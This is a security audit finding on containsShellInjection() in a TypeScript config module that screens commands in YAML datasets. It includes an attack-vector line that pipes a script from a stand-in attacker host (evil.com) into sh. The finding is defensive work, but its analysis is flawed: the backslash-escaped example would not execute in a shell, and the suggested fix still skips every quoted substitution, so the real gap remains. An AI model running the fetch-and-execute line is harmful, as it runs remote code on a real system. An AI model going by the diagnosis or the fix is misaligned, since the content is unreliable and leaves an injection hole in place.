# [P2] — Security: containsShellInjection() misses backslash-escaped metacharacters

**File:** `src/meta/config.ts`
**Line:** ~50
**Severity:** P2 (Medium)
**Category:** Security

## Description

The `containsShellInjection()` function checks for shell metacharacters (`;`, `` ` ``, `$()`, `||`) but does NOT handle backslash escapes. This means commands like `"\$(whoami)"` (double-quoted, backslash-escaped command substitution) will NOT be detected as injection.

The comment at line 23-26 explicitly acknowledges this limitation:
> "Tracks `"` and `'` quotes (but does NOT handle escapes — sufficient for detecting accidental-shaped injections in typical YAML datasets, not a hardened shell lexer)."

However, this gap could be exploited by a malicious YAML dataset.

## Evidence

```typescript
// src/meta/config.ts
export function containsShellInjection(cmd: string): boolean {
  let inDouble = false;
  let inSingle = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i]!;
    const next = cmd[i + 1];
    if (!inDouble && c === "'") { inSingle = !inSingle; continue; }
    if (!inSingle && c === '"') { inDouble = !inDouble; continue; }
    if (inDouble || inSingle) continue;  // ← backslash NOT handled when inside quotes
    if (c === ';' || c === '`') return true;
    if (c === '$' && (next === '(' || next === '{')) return true;
    if (c === '|' && next === '|') return true;
  }
  return false;
}
```

**Attack vector:**
```yaml
setupCommand: 'echo "Hello \$(curl http://evil.com/shell.sh | sh)"'
```

The `$(...)` is inside double quotes and preceded by `\`, so `inDouble` is true when we see `$`, and we skip. The `\$(` sequence is not recognized as an injection.

## Impact

If a hostile YAML harness dataset is loaded (via clone/pull), command injection could occur through:
- `setupCommand`
- `scorer.command`
- Criterion values

The threat model states: "a hostile YAML dataset shipped via clone/pull that piggybacks RCE onto `setupCommand` or `scorer.command`."

## Recommended Fix

Handle backslash escapes within quoted strings:

```typescript
export function containsShellInjection(cmd: string): boolean {
  let inDouble = false;
  let inSingle = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i]!;
    const next = cmd[i + 1];
    if (c === '\\' && i + 1 < cmd.length) { i++; continue; } // skip escaped char
    if (!inDouble && c === "'") { inSingle = !inSingle; continue; }
    if (!inSingle && c === '"') { inDouble = !inDouble; continue; }
    if (inDouble || inSingle) continue;
    if (c === ';' || c === '`') return true;
    if (c === '$' && (next === '(' || next === '{')) return true;
    if (c === '|' && next === '|') return true;
  }
  return false;
}
```

Or consider using a proper shell lexer instead of regex-based detection.
